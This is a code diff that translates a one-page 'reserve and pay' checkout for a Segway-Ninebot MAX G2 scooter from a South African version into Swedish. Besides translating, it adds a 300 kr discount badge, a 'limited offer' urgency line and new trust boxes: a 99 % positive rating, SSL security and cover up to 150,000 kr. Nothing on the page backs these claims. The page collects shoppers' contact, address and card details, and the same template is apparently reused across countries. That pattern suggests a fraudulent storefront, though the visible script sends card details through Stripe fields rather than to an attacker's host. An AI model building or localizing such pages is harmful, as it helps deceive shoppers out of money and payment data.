@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="sv">
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1, viewport-fit=cover" />
-<title>Secure Payment • Segway-Ninebot MAX G2</title>
+<title>Säker betalning • Segway-Ninebot MAX G2</title>
 
 <!-- Google tag -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-FDQ6REQWS8"></script>
@@ -53,6 +53,18 @@ body{
 }
 .btn.primary{background:var(--brand);color:#fff;border-color:var(--brand)}
 .btn-row{display:flex;gap:12px;margin-top:14px}
+
+.badge{
+  display:inline-block;
+  background:#16a34a;
+  color:#fff;
+  padding:6px 10px;
+  border-radius:999px;
+  font-size:13px;
+  font-weight:800;
+  margin-bottom:10px;
+}
+
 #err{
   display:none;
   margin-top:10px;
@@ -64,7 +76,7 @@ body{
 }
 #err[aria-hidden="false"]{display:block}
 
-/* Trust blocks (from ZA checkout) */
+/* Card logos */
 .logos{
   display:flex;
   gap:12px;
@@ -73,6 +85,7 @@ body{
 }
 .logos img{height:22px}
 
+/* Trust blocks */
 .trust{
   display:grid;
   grid-template-columns:1fr 1fr 1fr;
@@ -118,30 +131,33 @@ body{
 
 <div class="wrap">
 
-<!-- STEP 1 -->
+<!-- STEG 1 -->
 <section id="step1" class="card step" aria-hidden="false">
-  <h2>Reserve your Segway-Ninebot MAX G2</h2>
+  <span class="badge">🎉 Spara 300 kr idag</span>
+  <h2>Reservera din Segway-Ninebot MAX G2</h2>
+  <p>Begränsat erbjudande – säkra din rabatt innan den försvinner.</p>
 
   <div class="grid">
-    <input id="nameInput" class="input" placeholder="Full name" autocomplete="name">
-    <input id="emailInput" class="input" type="email" placeholder="Email" autocomplete="email">
-    <input id="phoneNumber" class="input" placeholder="Phone number" autocomplete="tel">
+    <input id="nameInput" class="input" placeholder="Fullständigt namn" autocomplete="name">
+    <input id="emailInput" class="input" type="email" placeholder="E-postadress" autocomplete="email">
+    <input id="phoneNumber" class="input" placeholder="Telefonnummer" autocomplete="tel">
   </div>
 
   <div class="btn-row">
-    <button id="nextBtn" class="btn primary" type="button">Next step →</button>
+    <button id="nextBtn" class="btn primary" type="button">Nästa steg →</button>
   </div>
 </section>
 
-<!-- STEP 2 -->
+<!-- STEG 2 -->
 <section id="step2" class="card step" aria-hidden="true">
-  <h2>Secure Payment</h2>
+  <h2>Säker betalning</h2>
+  <p>Alla kortuppgifter krypteras och behandlas av Stripe.</p>
 
   <div class="grid">
-    <input id="billingStreet" class="input" placeholder="Street address">
-    <input id="billingCity" class="input" placeholder="City">
-    <input id="billingPostcode" class="input" placeholder="Post code">
-    <input class="input" value="South Africa" disabled>
+    <input id="billingStreet" class="input" placeholder="Gatuadress">
+    <input id="billingCity" class="input" placeholder="Stad">
+    <input id="billingPostcode" class="input" placeholder="Postnummer">
+    <input class="input" value="Sverige" disabled>
   </div>
 
   <div id="card-number" class="el"></div>
@@ -154,22 +170,22 @@ body{
   <div class="logos">
     <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
     <img src="https://charmr.xyz/logos/mc2.png" alt="Mastercard">
-    <img src="https://charmr.xyz/logos/amex.png" alt="Amex">
+    <img src="https://charmr.xyz/logos/amex.png" alt="American Express">
     <img src="https://www.gstatic.com/instantbuy/svg/dark_gpay.svg" alt="Google Pay">
   </div>
 
-  <!-- Trust indicators -->
+  <!-- Trust -->
   <div class="trust">
-    <div class="box">⭐<br><strong>99% positive</strong></div>
-    <div class="box">🔒<br><strong>SSL secured</strong></div>
-    <div class="box">🛡️<br><strong>ZAR 250,000</strong></div>
+    <div class="box">⭐<br><strong>99 % positiva omdömen</strong></div>
+    <div class="box">🔒<br><strong>SSL-säkrad</strong></div>
+    <div class="box">🛡️<br><strong>Upp till 150 000 kr</strong></div>
   </div>
 
   <div id="err" aria-hidden="true"></div>
 
   <div class="btn-row">
-    <button id="backBtn" class="btn" type="button">← Back</button>
-    <button id="payNow" class="btn primary" type="button">Pay securely</button>
+    <button id="backBtn" class="btn" type="button">← Tillbaka</button>
+    <button id="payNow" class="btn primary" type="button">Betala säkert</button>
   </div>
 </section>
 
@@ -178,7 +194,7 @@ body{
 <!-- Loading overlay -->
 <div id="loading-overlay" class="loading-overlay" aria-hidden="true">
   <div class="loading-box">
-    <strong>Processing payment…</strong>
+    <strong>Behandlar betalning…</strong>
     <div class="progress"><div class="bar"></div></div>
   </div>
 </div>
@@ -206,17 +222,17 @@ document.addEventListener("DOMContentLoaded", () => {
   const err = document.getElementById("err");
   const overlay = document.getElementById("loading-overlay");
 
-  nextBtn.addEventListener("click", () => {
+  nextBtn.onclick = () => {
     step1.setAttribute("aria-hidden","true");
     step2.setAttribute("aria-hidden","false");
-  });
+  };
 
-  backBtn.addEventListener("click", () => {
+  backBtn.onclick = () => {
     step2.setAttribute("aria-hidden","true");
     step1.setAttribute("aria-hidden","false");
-  });
+  };
 
-  payNow.addEventListener("click", async () => {
+  payNow.onclick = async () => {
     payNow.disabled = true;
     overlay.setAttribute("aria-hidden","false");
     err.setAttribute("aria-hidden","true");
@@ -229,7 +245,7 @@ document.addEventListener("DOMContentLoaded", () => {
         line1: billingStreet.value,
         city: billingCity.value,
         postal_code: billingPostcode.value,
-        country:"ZA"
+        country:"SE"
       }
     };
 
@@ -259,12 +275,12 @@ document.addEventListener("DOMContentLoaded", () => {
       window.location.href = "thankyou.html";
 
     }catch(e){
-      err.textContent = e.message || "Payment failed";
+      err.textContent = e.message || "Betalningen misslyckades";
       err.setAttribute("aria-hidden","false");
       overlay.setAttribute("aria-hidden","true");
       payNow.disabled = false;
     }
-  });
+  };
 
 });
 </script>
